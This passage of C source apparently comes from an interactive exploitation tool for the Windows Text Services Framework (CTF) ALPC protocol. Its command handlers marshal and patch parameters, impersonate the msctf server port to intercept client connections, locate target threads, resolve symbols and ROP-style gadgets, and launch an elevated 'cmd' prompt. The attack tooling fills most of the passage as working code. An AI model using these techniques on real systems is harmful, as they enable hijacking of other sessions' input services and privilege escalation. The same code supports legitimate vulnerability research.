{\r\n        LogMessage(stderr, \"You haven't specified all %u parameters.\", CountMarshalParams);\r\n        return 1;\r\n    }\r\n\r\n    // Now we need to create the proxy data.\r\n    Result = SendReceiveProxyData(PortHandle,\r\n                                  MSG_CALLSTUB | MSGFLAG_DATA_APPENDED,\r\n                                  MarshalParams,\r\n                                  CountMarshalParams,\r\n                                  StubRecord,\r\n                                  FunctionNum,\r\n                                  ThreadId);\r\n\r\n    if (Result != 0) {\r\n        if (NonInteractive == FALSE) {\r\n            LogMessage(stderr,  \"Sending the Proxy data failed, %#x\", Result);\r\n        }\r\n        return 1;\r\n    }\r\n\r\n    LogMessage(stderr, \"Command succeeded.\");\r\n\r\n    // Search through the parameters for any stubs we need to know about.\r\n    for (ULONG Index = 0; Index < CountMarshalParams; Index++) {\r\n        if (MarshalParams[Index].TypeFlags & MARSHAL_FLAG_OUTPUT) {\r\n            LogMessage(stdout, \"Parameter %u has the output flag set.\", Index);\r\n\r\n            MarshalParamsDumpData(MarshalParams, Index);\r\n\r\n            // Remember this stub so user doesnt have to type it all in.\r\n            if ((MarshalParams[Index].TypeFlags & MARSHAL_TYPE_MASK) == MARSHAL_TYPE_COM) {\r\n                if (NumStubs >= MAX_STUBS) {\r\n                    LogMessage(stderr, \"Sorry, ran out of stub storage space, see `help forget`.\");\r\n                    continue;\r\n                }\r\n\r\n                StubRecords[NumStubs].ThreadId = ThreadId;\r\n\r\n                // Copy over the details.\r\n                memcpy(&StubRecords[NumStubs].Stub,\r\n                       MarshalDataPtr(PVOID, MarshalParams, Index),\r\n                       sizeof(CTF_MARSHAL_COMSTUB));\r\n\r\n                // Record the last stubid seen.\r\n                DefaultStub = StubRecords[NumStubs].Stub.StubId;\r\n\r\n                // Done saving stubs.\r\n                NumStubs++;\r\n\r\n                LogMessage(stdout, \"StubID %llu recorded.\", DefaultStub);\r\n            }\r\n        }\r\n    }\r\n\r\n    return 1;\r\n}\r\n\r\nULONG MarshalHandler(PCHAR Command, ULONG ParamCount, PCHAR *Parameters)\r\n{\r\n    DWORD ThreadId;\r\n    DWORD MessageNum;\r\n    HRESULT Result;\r\n\r\n    // marshal thread message\r\n    ThreadId    = DecodeIntegerParameter(*Parameters);\r\n    ThreadId    = ThreadId ? ThreadId : DefaultThread;\r\n\r\n    if (GetCommandNum(Parameters[1]) >= 0) {\r\n        MessageNum = GetCommandNum(Parameters[1]);\r\n    } else {\r\n        MessageNum  = DecodeIntegerParameter(Parameters[1]);\r\n    }\r\n\r\n    if (CurrentMarshalParam != CountMarshalParams) {\r\n        LogMessage(stderr, \"You haven't specified all %u parameters, is that intentional?\", CountMarshalParams);\r\n    }\r\n\r\n    // Send data to the server.\r\n    Result = SendReceiveMarshalData(PortHandle,\r\n                                    MessageNum | MSGFLAG_DATA_APPENDED,\r\n                                    MarshalParams,\r\n                                    CountMarshalParams,\r\n                                    ThreadId);\r\n\r\n    LogMessage(stderr, \"Result: %#x, use `getarg` if you want to examine data\",\r\n                        Result);\r\n\r\n    return 1;\r\n}\r\n\r\nULONG SetArgHandler(PCHAR Command, ULONG ParamCount, PCHAR *Parameters)\r\n{\r\n    DWORD TypeFlags = 0;\r\n    DWORD Size = 0;\r\n    PVOID Value = NULL;\r\n\r\n    // setarg count\r\n    if (ParamCount == 1) {\r\n        MarshalParamsFree(MarshalParams);\r\n\r\n        CurrentMarshalParam = 0;\r\n        CountMarshalParams  = DecodeIntegerParameter(*Parameters);\r\n        MarshalParams       = NULL;\r\n\r\n        if (NonInteractive == FALSE) {\r\n            LogMessage(stderr, \"New Parameter Chain, Length %u\", CountMarshalParams);\r\n        }\r\n        return 1;\r\n    }\r\n\r\n    if (ParamCount < 2) {\r\n        LogMessage(stderr, \"Not enough parameters!\");\r\n        return 1;\r\n    }\r\n\r\n    if (CurrentMarshalParam >= CountMarshalParams) {\r\n        LogMessage(stderr, \"Sorry, you must declare how many params you need using setarg.\");\r\n        LogMessage(stderr, \"This param would take you over the limit of %u you specified.\", CountMarshalParams);\r\n        return 1;\r\n    }\r\n\r\n    // Consume everything until the last parameter (the value)\r\n    for (ULONG Position = 0; Position < ParamCount - 1; Position++) {\r\n        DWORD DecodedFlag = GetMarshalFlagNum(Parameters[Position]);\r\n\r\n        // Zero is a valid type, so check this round trips to validate.\r\n        if (strcmp(GetMarshalFlagName(DecodedFlag), Parameters[Position]) == 0) {\r\n            TypeFlags |= DecodedFlag;\r\n        } else {\r\n            TypeFlags |= DecodeIntegerParameter(Parameters[Position]);\r\n        }\r\n    }\r\n\r\n    switch (TypeFlags & MARSHAL_TYPE_MASK) {\r\n        default:\r\n            LogMessage(stderr, \"Type not supported yet, treating as data.\");\r\n            // fallthrough, maybe just treating it like data will work.\r\n        case MARSHAL_TYPE_STRUCT:\r\n        case MARSHAL_TYPE_DATA: {\r\n            static GUID ParsedGuid;\r\n            static BYTE HexBuf[MAX_BUF];\r\n            WCHAR WideParameter[512] = {0};\r\n            CHAR CurrentChar[3] = {0};\r\n            PCHAR ByteString = Parameters[ParamCount - 1];\r\n            ULONG ParamLength = strlen(ByteString);\r\n\r\n            // First we try to parse it as a GUID, a very common case in CTF.\r\n            // The format is 00000000-0000-0000-0000-000000000000\r\n            _snwprintf(WideParameter, _countof(WideParameter) - 1, L\"{%hs}\", ByteString);\r\n\r\n            #pragma warning(suppress: 6053)\r\n            if (CLSIDFromString(WideParameter, &ParsedGuid) == 0) {\r\n                Value = &ParsedGuid;\r\n                Size = sizeof ParsedGuid;\r\n                break;\r\n            }\r\n\r\n            // FIXME: dont handle spaces\r\n            // Maybe it's a string, the format is \"arbitrary data\"\r\n            if (ParamLength >= 2 && ByteString[0] == '\"' && ByteString[ParamLength-1] == '\"') {\r\n                // It is a string, just strcpy the data. If you want special characters, use hex mode.\r\n                Value = &ByteString[1];\r\n                Size  = ParamLength - 2; // for the quotes.\r\n                break;\r\n            }\r\n\r\n            // Maybe it's a string, but the user wants us to convert it to UTF-16\r\n            if (ParamLength >= 3 && ByteString[0] == 'L' && ByteString[1] == '\"' && ByteString[ParamLength-1] == '\"') {\r\n                _snwprintf(WideParameter, _countof(WideParameter), L\"%hs\", ByteString + 2);\r\n                Value = WideParameter;\r\n                Size  = (ParamLength - 3) * sizeof(WCHAR); // -3 for the quotes and 'L'\r\n                break;\r\n            }\r\n\r\n            // The only other option is a hex buffer.\r\n            if (strlen(ByteString) & 1) {\r\n                LogMessage(stderr, \"Parsing as a hex string, but you didn't specify enough characters!\");\r\n                return 1;\r\n            }\r\n\r\n            if (strlen(ByteString) > MAX_BUF * 2) {\r\n                LogMessage(stderr, \"Parsing as a hex string, but you specified too many characters!\");\r\n                return 1;\r\n            }\r\n\r\n            // Parse as a hex string, e.g. 41414141412eff00\r\n            for (Size = 0; *ByteString;) {\r\n                CurrentChar[0] = *ByteString++;\r\n                CurrentChar[1] = *ByteString++;\r\n                #pragma warning(suppress: 6328)\r\n                if (sscanf(CurrentChar, \"%hhx\", &HexBuf[Size++]) != 1) {\r\n                    LogMessage(stderr, \"Parsing hex string but failed, I stopped at %s\", CurrentChar);\r\n                    return 1;\r\n                }\r\n            }\r\n\r\n            Value = HexBuf;\r\n            break;\r\n        }\r\n        case MARSHAL_TYPE_COM: {\r\n            static CTF_MARSHAL_COMSTUB ComStub;\r\n            DWORD StubId;\r\n\r\n            StubId  = DecodeIntegerParameter(Parameters[ParamCount - 1]);\r\n            Value   = &ComStub;\r\n            Size    = sizeof(ComStub);\r\n\r\n            // First search for this stub\r\n            for (int i = 0; i < NumStubs; i++) {\r\n                if (StubRecords[i].Stub.StubId == StubId) {\r\n                    memcpy(&ComStub, &StubRecords[i].Stub, sizeof ComStub);\r\n                    break;\r\n                }\r\n            }\r\n            break;\r\n        }\r\n        case MARSHAL_TYPE_LONG:\r\n        case MARSHAL_TYPE_WORD:\r\n        case MARSHAL_TYPE_INT: {\r\n            static UINT64 Number;\r\n            Number  = DecodeIntegerParameter(Parameters[ParamCount - 1]);\r\n            Value   = &Number;\r\n            Size    = sizeof(UINT64);\r\n            break;\r\n        }\r\n    }\r\n\r\n    MarshalParams = MarshalParamsInsertData(MarshalParams,\r\n                                            CountMarshalParams,\r\n                                            CurrentMarshalParam,\r\n                                            TypeFlags,\r\n                                            Value,\r\n                                            Size,\r\n                                            FALSE);\r\n\r\n    if (NonInteractive == FALSE) {\r\n        MarshalParamsDumpData(MarshalParams, CurrentMarshalParam);\r\n    }\r\n\r\n    CurrentMarshalParam++;\r\n    return 1;\r\n}\r\n\r\nULONG GetArgHandler(PCHAR Command, ULONG ParamCount, PCHAR *Parameters)\r\n{\r\n    DWORD Index = DecodeIntegerParameter(Parameters[0]);\r\n    if (Index >= CurrentMarshalParam) {\r\n        LogMessage(stderr, \"Bad index requested!\");\r\n        return 1;\r\n    }\r\n    MarshalParamsDumpData(MarshalParams, Index);\r\n    return 1;\r\n}\r\n\r\nULONG ModuleHandler(PCHAR Command, ULONG ParamCount, PCHAR *Parameters)\r\n{\r\n    LastModuleBase = QueryModuleHandle32(*Parameters);\r\n    LogMessage(stdout, \"%#llx\", LastModuleBase);\r\n    return 1;\r\n}\r\n\r\nULONG ModuleHandler64(PCHAR Command, ULONG ParamCount, PCHAR *Parameters)\r\n{\r\n    LastModuleBase = QueryModuleHandle64(*Parameters);\r\n    LogMessage(stdout, \"%#llx\", LastModuleBase);\r\n    return 1;\r\n}\r\n\r\nULONG EditArgHandler(PCHAR Command, ULONG ParamCount, PCHAR *Parameters)\r\n{\r\n    DWORD Index = DecodeIntegerParameter(*Parameters);\r\n\r\n    if (Index >= CurrentMarshalParam) {\r\n        LogMessage(stderr, \"Bad index requested!\");\r\n        return 1;\r\n    }\r\n\r\n    MarshalParams[Index].TypeFlags = DecodeIntegerParameter(Parameters[1]);\r\n    MarshalParamsDumpData(MarshalParams, Index);\r\n    return 1;\r\n}\r\n\r\nULONG PatchHandler(PCHAR Command, ULONG ParamCount, PCHAR *Parameters)\r\n{\r\n    DWORD Index;\r\n    DWORD Offset;\r\n    DWORD Width;\r\n    DWORD Shift;\r\n    UINT64 Adjust;\r\n    UINT64 Value;\r\n\r\n    Width = Index = Offset = Value = Shift = Adjust = 0;\r\n\r\n    switch (ParamCount) {\r\n        case 6: Shift   = DecodeIntegerParameter(Parameters[5]);\r\n        case 5: Adjust  = DecodeIntegerParameter(Parameters[4]);\r\n        case 4: Index   = DecodeIntegerParameter(Parameters[0]);\r\n                Offset  = DecodeIntegerParameter(Parameters[1]);\r\n                Value   = DecodeIntegerParameter(Parameters[2]);\r\n                Width   = DecodeIntegerParameter(Parameters[3]);\r\n    }\r\n\r\n    if (Index >= CurrentMarshalParam) {\r\n        LogMessage(stderr, \"Bad index requested!\");\r\n        return 1;\r\n    }\r\n\r\n    if (Offset + Width > MarshalParams[Index].Size) {\r\n        LogMessage(stderr, \"Bad offset or width, the parameter is only %#x bytes\",\r\n                           MarshalParams[Index].Size);\r\n        return 1;\r\n    }\r\n\r\n    if (Width > 8) {\r\n        LogMessage(stderr, \"Sorry, maximum width supported is 8 bytes (QWORD)\");\r\n        return 1;\r\n    }\r\n\r\n    if (Shift > Width * CHAR_BIT) {\r\n        LogMessage(stderr, \"Shift parameter shifts out too many bits\");\r\n        return 1;\r\n    }\r\n\r\n    if (NonInteractive == FALSE) {\r\n        LogMessage(stdout, \"Dumping Original...\");\r\n        MarshalParamsDumpData(MarshalParams, Index);\r\n    }\r\n\r\n    Value  += Adjust;\r\n    Value >>= Shift;\r\n\r\n    memcpy((PBYTE)(MarshalParams) + MarshalParams[Index].Start + Offset, &Value, Width);\r\n\r\n    if (NonInteractive == FALSE) {\r\n        LogMessage(stdout, \"Dumping New...\");\r\n        MarshalParamsDumpData(MarshalParams, Index);\r\n    }\r\n\r\n    return 1;\r\n}\r\n\r\nULONG HijackHandler(PCHAR Command, ULONG ParamCount, PCHAR *Parameters)\r\n{\r\n    PSECURITY_DESCRIPTOR SecurityDescriptor;\r\n    OBJECT_ATTRIBUTES ObjectAttributes;\r\n    WCHAR PathName[MAX_PATH];\r\n    UNICODE_STRING PortName;\r\n    ALPC_PORT_ATTRIBUTES PortAttributes;\r\n    HANDLE ServerHandle = INVALID_HANDLE_VALUE;\r\n    ULONG BufferLength = sizeof(CTF_CONNECT_MSG);\r\n    NTSTATUS Result;\r\n    ULONG MessageAttributeSize;\r\n    CTF_CONNECT_MSG ConnectMessage; \r\n    PALPC_MESSAGE_ATTRIBUTES ReceiveMessageAttributes = NULL;\r\n\r\n    // Generate the requested portname.\r\n     _snwprintf(PathName, _countof(PathName), L\"\\\\BaseNamedObjects\\\\msctf.server%hs%llu\",\r\n                                              Parameters[0],\r\n                                              DecodeIntegerParameter(Parameters[1]));\r\n\r\n\r\n\r\n    // I copied the descriptor from msctf.dll\r\n    ConvertStringSecurityDescriptorToSecurityDescriptor(\r\n        \"D:P(A;OICI;0x01;;;AU)(A;OICI;0x01;;;SY)(A;OICI;0x01;;;IU)(A;OICI;0x01;;;AC)(A;OICI;0x01;;;S-1-15-3-1024-1502825166-1963708345-2616377461-2562897074-4192028372-3968301570-1997628692-1435953622)\",\r\n        SDDL_REVISION,\r\n        &SecurityDescriptor,\r\n        NULL);\r\n\r\n    RtlInitUnicodeString(&PortName, PathName);\r\n    InitializeObjectAttributes(&ObjectAttributes, &PortName, 64, NULL, SecurityDescriptor);\r\n    ZeroMemory(&PortAttributes, sizeof PortAttributes);\r\n    PortAttributes.Flags = 0xA0000;\r\n    PortAttributes.SecurityQos.ImpersonationLevel = 0;\r\n    PortAttributes.MemoryBandwidth = 0;\r\n    PortAttributes.MaxMessageLength = 512;\r\n    PortAttributes.MaxPoolUsage = 0x20000;\r\n    PortAttributes.MaxSectionSize = 0x20000;\r\n    PortAttributes.MaxTotalSectionSize = 0x20000;\r\n    PortAttributes.DupObjectTypes = 0x100000;\r\n    PortAttributes.SecurityQos.Length = sizeof(PortAttributes.SecurityQos);\r\n    PortAttributes.SecurityQos.ContextTrackingMode = TRUE;\r\n\r\n    Result = NtAlpcCreatePort(&ServerHandle, &ObjectAttributes, &PortAttributes);\r\n\r\n    LogMessage(stdout, \"NtAlpcCreatePort(\\\"%S\\\") => %#x %p\", PathName, Result, ServerHandle);\r\n\r\n    if (AlpcInitializeMessageAttribute(0x60000000, NULL, 0, &MessageAttributeSize) != STATUS_BUFFER_TOO_SMALL) {   \r\n        LogMessage(stderr, \"unexpected result from AlpcInitializeMessageAttribute()\");\r\n        goto cleanup;\r\n    }\r\n\r\n    ReceiveMessageAttributes = calloc(1, MessageAttributeSize);\r\n\r\n    if (AlpcInitializeMessageAttribute(0x60000000,\r\n                                       ReceiveMessageAttributes,\r\n                                       MessageAttributeSize,\r\n                                       &MessageAttributeSize) < 0) {\r\n        LogMessage(stderr, \"AlpcInitializeMessageAttribute failed\");\r\n        goto cleanup;\r\n    }\r\n\r\n    ReceiveMessageAttributes->ValidAttributes = 0;\r\n\r\n    InitializeMessageHeader(&ConnectMessage.Header, BufferLength, 0);\r\n\r\n    do {\r\n        HANDLE ClientHandle = 0;\r\n        BufferLength = sizeof(CTF_CONNECT_MSG);\r\n\r\n        Result = NtAlpcSendWaitReceivePort(ServerHandle,\r\n                                           0,\r\n                                           NULL,\r\n                                           NULL,\r\n                                           &ConnectMessage.Header,\r\n                                           &BufferLength,\r\n                                           ReceiveMessageAttributes,\r\n                                           NULL);\r\n        LogMessage(stdout, \"NtAlpcSendWaitReceivePort(\\\"%S\\\") => %#x %p\", PathName, Result, ServerHandle);\r\n\r\n        hexdump(&ConnectMessage, BufferLength);\r\n\r\n        LogMessage(stdout, \"A %#hhx message received\", ConnectMessage.Header.u2.s2.Type);\r\n\r\n        if ((ConnectMessage.Header.u2.s2.Type & 0xFF) == LPC_CONNECTION_REQUEST) {\r\n            PCHAR ImageName = QueryImageName(ConnectMessage.ProcessId);\r\n            LogMessage(stderr, \"\\tProcessID: %u, %s\", ConnectMessage.ProcessId, ImageName);\r\n            LogMessage(stderr, \"\\tThreadId: %u\", ConnectMessage.ThreadId);\r\n            LogMessage(stderr, \"\\tWindowID: %p\", ConnectMessage.WindowId);\r\n            free(ImageName);\r\n        }\r\n\r\n        // Reject the connection so things dont time out.\r\n        NtAlpcAcceptConnectPort(&ClientHandle, ServerHandle, 0, 0, 0, 0, &ConnectMessage.Header, 0, 0);\r\n\r\n        if (ClientHandle) {\r\n            CloseHandle(ClientHandle);\r\n        }\r\n    } while (Result == 0);\r\n\r\ncleanup:\r\n    free(ReceiveMessageAttributes);\r\n\r\n    return 1;\r\n}\r\n\r\nULONG ConnectHandler(PCHAR Command, ULONG ParamCount, PCHAR *Parameters)\r\n{\r\n    DWORD SessionId;\r\n    WCHAR PortName[MAX_PATH];\r\n    CTF_CONNECT_MSG ConnectMessage;\r\n\r\n    if (PortHandle) {\r\n        LogMessage(stderr, \"Closing existing ALPC Port Handle %p...\", PortHandle);\r\n        CloseHandle(PortHandle);\r\n    }\r\n \r\n    if (ParamCount == 2) {\r\n        // The desktopname is usually \"Default\"\r\n        SessionId = DecodeIntegerParameter(Parameters[1]);\r\n        _snwprintf(PortName, _countof(PortName), L\"\\\\BaseNamedObjects\\\\msctf.server%hs%u\",\r\n                                                *Parameters,\r\n                                                SessionId);\r\n    } else {\r\n        // No parameters, connect to current desktop and session.\r\n        if (GetServerPortName(PortName, sizeof PortName) == FALSE) {\r\n            LogMessage(stderr, \"Failed to lookup ctf server port.\");\r\n            return 1;\r\n        }\r\n    }\r\n\r\n    LogMessage(stdout, \"The ctf server port is located at %S\", PortName);\r\n\r\n    ZeroMemory(&ConnectMessage, sizeof ConnectMessage);\r\n    ConnectMessage.ProcessId    = GetCurrentProcessId();\r\n    ConnectMessage.ThreadId     = ClientThreadId;\r\n    ConnectMessage.WindowId     = MessageWindow;\r\n    ConnectMessage.TickCount    = GetTickCount();\r\n    ConnectMessage.ClientFlags  = ClientFlags;\r\n\r\n    do {\r\n        PortHandle = OpenAlpcPort(PortName, &ConnectMessage.Header, sizeof ConnectMessage);\r\n\r\n        // If the user specified a port, keep trying.\r\n        if (PortHandle == INVALID_HANDLE_VALUE && ParamCount == 2) {\r\n            LogMessage(stderr, \"Waiting for the specified port to appear...\");\r\n            Sleep(5000);\r\n        } else {\r\n            break;\r\n        }\r\n    } while (true);\r\n\r\n    LogMessage(stdout, \"Connected to CTF server@%S, Handle %p\", PortName, PortHandle);\r\n\r\n    return 1;\r\n}\r\n\r\nULONG WaitHandler(PCHAR Command, ULONG ParamCount, PCHAR *Parameters)\r\n{\r\n    UINT Count = 0;\r\n    CTF_MSGBASE Message;\r\n    HRESULT Result;\r\n    HANDLE SnapshotHandle;\r\n    HWND ClientWindow;\r\n    DWORD Delay = 5000;\r\n    LARGE_INTEGER Timeout = {\r\n        .QuadPart = -100000LL,\r\n    };\r\n    THREADENTRY32 ThreadData = {\r\n        .dwSize = sizeof(ThreadData),\r\n    };\r\n\r\n    // Optional Poll Delay\r\n    if (ParamCount > 1) {\r\n        Delay = DecodeIntegerParameter(Parameters[1]);\r\n        LogMessage(stdout, \"Poll delay set to %u milliseconds\", Delay);\r\n    }\r\n\r\n    // wait notepad.exe\r\n    do {\r\n        SnapshotHandle = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);\r\n\r\n        if (SnapshotHandle == INVALID_HANDLE_VALUE) {\r\n            LogMessage(stderr, \"failed to create tool snapshot\");\r\n            goto cleanup;\r\n        }\r\n \r\n        if (Thread32First(SnapshotHandle, &ThreadData) == false) {\r\n            LogMessage(stderr, \"failed to query system threads\");\r\n            goto cleanup;\r\n        }\r\n\r\n        do {\r\n            ZeroMemory(&Message, sizeof Message);\r\n\r\n            // Note that nothing is stopping clients lying.\r\n            // MSG_GETCLIENTINFOEX accepts\r\n            //  [0] ThreadId\r\n            // MSG_GETCLIENTINFOEX returns\r\n            //  [0] Client Flags\r\n            //  [1] ProcessId\r\n            //  [2] GetTickCount() generated by client when registering.\r\n\r\n            Message.Message = MSG_GETCLIENTINFOEX;\r\n            Message.SrcThreadId = ClientThreadId;\r\n            Message.Params[0] = ThreadData.th32ThreadID;\r\n\r\n            Result = SendReceivePortMessage(PortHandle,\r\n                                            &Message.Header,\r\n                                            sizeof Message,\r\n                                            &Timeout);\r\n\r\n            if (Result != 0) {\r\n                LogMessage(stderr, \"failed to send message to server, %#x\", Result);\r\n\r\n                // No point continuing if the port is dead.\r\n                switch (Result) {\r\n                    case WAIT_TIMEOUT:\r\n                        LogMessage(stderr, \"timeout waiting for response from server.\");\r\n                        LogMessage(stderr, \"recommend reconnecting with `connect`\");\r\n                        // fallthrough\r\n                    case STATUS_PORT_DISCONNECTED:\r\n                    case STATUS_INVALID_HANDLE:\r\n                        goto cleanup;\r\n                }\r\n            }\r\n\r\n            if (Message.Result == 0) {\r\n                PCHAR ImageName = QueryImageName(ThreadData.th32OwnerProcessID);\r\n\r\n                // Make sure this makes sense.\r\n                if (Message.Params[1]) {\r\n                    if (ThreadData.th32OwnerProcessID != Message.Params[1]) {\r\n                        LogMessage(stderr, \"Unexpected ProcessId %#x vs %#x (%s)\",\r\n                                            ThreadData.th32OwnerProcessID,\r\n                                            Message.Params[1],\r\n                                            ImageName);\r\n                        free(ImageName);\r\n                        continue;\r\n                    }\r\n                }\r\n\r\n                if (ImageName && strcmp(ImageName, Parameters[0]) == 0) {\r\n                    DefaultThread = ThreadData.th32ThreadID;\r\n                    LogMessage(stdout, \"Found new client %s, DefaultThread now %llu\", ImageName, DefaultThread);\r\n                    free(ImageName);\r\n                    goto cleanup;\r\n                }\r\n                free(ImageName);\r\n            }\r\n        } while(Thread32Next(SnapshotHandle, &ThreadData));\r\n        Sleep(Delay);\r\n    } while (true);\r\n\r\ncleanup:\r\n    CloseHandle(SnapshotHandle);\r\n    return 1;\r\n}\r\n\r\nULONG SymbolHandler(PCHAR Command, ULONG ParamCount, PCHAR *Parameters)\r\n{\r\n    CHAR ModulePath[MAX_PATH] = {0};\r\n    PCHAR Module = *Parameters;\r\n    PCHAR Symbol = strchr(Module, '!');\r\n    BOOL Is64;\r\n    UINT64 ImageBase;\r\n    UINT64 Address;\r\n    PVOID OldValue;\r\n\r\n    if (Symbol == NULL) {\r\n        LogMessage(stderr, \"Could not parse %s, use the format module!symbol.\", Module);\r\n        return 1;\r\n    }\r\n\r\n    // Split into tokens.\r\n    *Symbol++ = '\\0';\r\n\r\n    // Copy the name while we figure out where it is.\r\n    strncpy(ModulePath, Module, MAX_PATH - 5);\r\n\r\n    // Is it already fully qualified?\r\n    if (PathIsRelative(Module)) {\r\n        // This doesnt do anything if there already is an extension.\r\n        PathAddExtension(ModulePath, \".DLL\");\r\n\r\n        // Check the usual places for it.\r\n        PathFindOnPathA(ModulePath, NULL);\r\n    }\r\n\r\n    LogMessage(stdout, \"Guessed %s => %s\", Module, ModulePath);\r\n\r\n    // Disable Redirection so we get the real files.\r\n    if (Wow64DisableWow64FsRedirection(&OldValue) == false) {\r\n        LogMessage(stderr, \"Could not disable redirection.\");\r\n    }\r\n\r\n    if (GetSymbolInfo64(ModulePath, Symbol, &Is64, &ImageBase, &Address)) {\r\n        LogMessage(stdout, \"%s is a %dbit module.\", ModulePath, Is64 ? 64 : 32);\r\n        LogMessage(stdout, \"%s!%s@%#llx+%#llx\", Module, Symbol, ImageBase, Address - ImageBase);\r\n\r\n        LastSymbolOffset = Address - ImageBase;\r\n    } else {\r\n        LogMessage(stderr, \"%s!%s Not found.\", Module, Symbol);\r\n    }\r\n\r\n    // Restore Redirection.\r\n    Wow64RevertWow64FsRedirection(OldValue);\r\n\r\n    return 1;\r\n}\r\n\r\nULONG ThreadHandler(PCHAR Command, ULONG ParamCount, PCHAR *Parameters)\r\n{\r\n    if (ParamCount) {\r\n        DefaultThread = DecodeIntegerParameter(*Parameters);\r\n    }\r\n    LogMessage(stdout, \"Default thread is %llu\", DefaultThread);\r\n    return 1;\r\n}\r\n\r\nstatic DWORD __stdcall BackgroundThread(LPVOID Parameter)\r\n{\r\n    ShellExecute(NULL, \"runas\", Parameter, 0, 0, SW_SHOWNORMAL);\r\n    return 0;\r\n}\r\n\r\nULONG ConsentHandler(PCHAR Command, ULONG ParamCount, PCHAR *Parameters)\r\n{\r\n    HANDLE RunasThread;\r\n\r\n    if (ParamCount) {\r\n        RunasThread = CreateThread(NULL, 0, BackgroundThread, *Parameters, 0, 0);\r\n    } else {\r\n        RunasThread = CreateThread(NULL, 0, BackgroundThread, \"cmd\", 0, 0);\r\n    }\r\n\r\n    CloseHandle(RunasThread);\r\n\r\n    return 1;\r\n}\r\n\r\nULONG RegHandler(PCHAR Command, ULONG ParamCount, PCHAR *Parameters)\r\n{\r\n    DWORD Value;\r\n    DWORD Size;\r\n    HKEY Root;\r\n    PCHAR Subkey;\r\n    LSTATUS Result;\r\n    DWORD ValueType;\r\n\r\n    Size      = sizeof Value;\r\n    Value     = -1;\r\n    ValueType = 0;\r\n\r\n    // By making the subkey the last parameter we dont have to worry\r\n    // about escaping special characters.\r\n    Subkey = GetOrigCommandLine(TRUE, 2);\r\n\r\n    // Strip any newline\r\n    if (strchr(Subkey, '\\n')) {\r\n        *strchr(Subkey, '\\n') = '\\0';\r\n    }\r\n\r\n    if (strcmp(*Parameters, \"HKLM\") == 0) {\r\n        Root = HKEY_LOCAL_MACHINE;\r\n    } else if (strcmp(*Parameters, \"HKCU\") == 0) {\r\n        Root = HKEY_CURRENT_USER;\r\n    } else if (strcmp(*Parameters, \"HKCR\") == 0) {\r\n        Root = HKEY_CLASSES_ROOT;\r\n    } else {\r\n        LogMessage(stderr, \"Unsupported root name %s\", *Parameters);\r\n        return 1;\r\n    }\r\n\r\n    Result = RegGetValueA(Root,\r\n                          Subkey,\r\n                          Parameters[1],\r\n                          RRF_RT_REG_DWORD,\r\n                          &ValueType,\r\n                          &Value,\r\n                          &Size);\r\n\r\n    if (Result == ERROR_UNSUPPORTED_TYPE && ValueType == REG_SZ) {\r\n        CHAR    StrVal[32] = {0};\r\n        PCHAR   EndChar;\r\n        DWORD   StrSize;\r\n\r\n        StrSize = sizeof StrVal;\r\n        EndChar = NULL;\r\n\r\n        Result = RegGetValueA(Root,\r\n                              Subkey,\r\n                              Parameters[1],\r\n                              RRF_RT_REG_SZ,\r\n                              NULL,\r\n                              StrVal,\r\n                              &StrSize);\r\n\r\n        if (Result == ERROR_SUCCESS) {\r\n            Value = strtoul(StrVal, &EndChar, 0);\r\n            if (*StrVal == '\\0' || *EndChar != '\\0')\r\n                Result = ERROR_UNSUPPORTED_TYPE;\r\n        }\r\n    }\r\n\r\n    if (Result == ERROR_UNSUPPORTED_TYPE) {\r\n        LogMessage(stdout, \"The key is not a DWORD, Type %#x\", ValueType);\r\n    }\r\n\r\n    if (Result != ERROR_SUCCESS) {\r\n        LogMessage(stdout, \"Failed to query %s, %#x\", Subkey, Result);\r\n        LastRegistryValue = -1;\r\n        return 1;\r\n    }\r\n\r\n    LogMessage(stdout, \"%s is %u\", Parameters[1], Value);\r\n\r\n    LastRegistryValue = Value;\r\n\r\n    return 1;\r\n}\r\n\r\nULONG WindowHandler(PCHAR Command, ULONG ParamCount, PCHAR *Parameters)\r\n{\r\n    CTF_MSGBASE Message;\r\n    HWND Window;\r\n    HRESULT Result;\r\n\r\n    ZeroMemory(&Message, sizeof Message);\r\n\r\n    Message.Message     = MSG_SETTHREADHWND;\r\n    Message.SrcThreadId = ClientThreadId;\r\n    Window              = CreateMessageWindow();\r\n    Message.Params[0]   = (DWORD) Window;\r\n\r\n    if (Window == NULL) {\r\n        LogMessage(stderr, \"failed to create window, %#x\", GetLastError());\r\n        return 1;\r\n    }\r\n\r\n    // Now register the window with monitor.\r\n    Result = SendReceivePortMessage(PortHandle, &Message.Header, sizeof Message, NULL);\r\n\r\n    if (Result != 0) {\r\n        LogMessage(stderr, \"failed to send message to server, %#x\", Result);\r\n        DestroyWindow(Window);\r\n    }\r\n\r\n    return 1;\r\n}\r\n\r\nULONG SectionHandler(PCHAR Command, ULONG ParamCount, PCHAR *Parameters)\r\n{\r\n    CHAR ModulePath[MAX_PATH] = {0};\r\n    BOOL Found;\r\n    PVOID OldValue;\r\n\r\n    // Copy the name while we figure out where it is.\r\n    strncpy(ModulePath, *Parameters, MAX_PATH - 5);\r\n\r\n    // Is it already fully qualified?\r\n    if (PathIsRelative(*Parameters)) {\r\n        // This doesnt do anything if there already is an extension.\r\n        PathAddExtension(ModulePath, \".DLL\");\r\n\r\n        // Check the usual places for it.\r\n        PathFindOnPathA(ModulePath, NULL);\r\n    }\r\n\r\n    // Disable Redirection so we get the real files.\r\n    Wow64DisableWow64FsRedirection(&OldValue);\r\n\r\n    Found = GetSectionProperty(ModulePath, Parameters[1], Parameters[2], &LastSectionResult);\r\n\r\n    // Restore Redirection.\r\n    Wow64RevertWow64FsRedirection(OldValue);\r\n\r\n    if (Found) {\r\n        LogMessage(stdout, \"%s->%s->%s is %#08llx\",\r\n                           ModulePath,\r\n                           Parameters[1],\r\n                           Parameters[2],\r\n                           LastSectionResult);\r\n    } else {\r\n        LogMessage(stdout, \"Failed to lookup %s property.\", Parameters[1]);\r\n    }\r\n\r\n    return 1;\r\n}\r\n\r\nULONG GadgetHandler(PCHAR Command, ULONG ParamCount, PCHAR *Parameters)\r\n{\r\n    SIZE_T Size;\r\n    INT64 Result;\r\n    PBYTE ByteString = Parameters[1];\r\n    BYTE HexBuf[MAX_BUF];\r\n\r\n    if (strlen(ByteString) & 1) {\r\n        LogMessage(stderr, \"Parsing as a hex string, but you didn't specify enough characters!\");\r\n        return 1;\r\n    }\r\n\r\n    if (strlen(ByteString) > MAX_BUF * 2) {\r\n        LogMessage(stderr, \"Parsing as a hex string, but you specified too many characters!\");\r\n        return 